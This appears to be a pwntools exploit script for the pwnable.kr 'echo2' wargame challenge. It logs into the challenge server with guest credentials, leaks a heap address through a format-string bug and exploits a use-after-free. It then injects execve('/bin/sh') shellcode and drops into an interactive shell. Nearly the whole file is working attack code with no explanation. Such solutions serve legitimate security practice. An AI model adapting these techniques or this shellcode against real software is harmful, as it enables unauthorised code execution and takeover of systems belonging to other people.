from pwn import *
from time import sleep

context.log_level = 'info'

session = ssh(user='echo2', host='pwnable.kr', port=2222, password='guest')
p = session.process('./echo2')
#p = session.process(['nc', '0', '9011'])

payload = "dalal"
p.sendline(payload.encode())

p.recvuntil(b'> ')

# get the address of `o` struct using FSB
payload = "2"
p.sendline(payload.encode())
print(p.recvline())

payload = "%p" * 10
p.sendline(payload.encode())
x = p.recvline().decode()
i = x.find("0x", 2)
o_addr = int(x[2: i], 16)
o_addr -= 0x31
print(f"o address: {hex(o_addr)}")
p.recvuntil(b'> ')

print("Freeing")
payload = "4"
p.sendline(payload.encode())
p.recvuntil(b')')

print("Saying no")
payload = "n"
p.sendline(payload.encode())
print(p.recvline())
sleep(0.5)

p.recvuntil(b'> ')

# write shellcode
print("Writing dalalcode")
p.sendline(b"3")

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05\x90"
shellcode += p64(o_addr)
print(f"Final Dalalcode Size: {len(shellcode)}, Final Dalalcode: {shellcode}")

p.sendline(shellcode)

p.recvuntil(b'> ')

# trigger
p.sendline(b"2")

p.interactive()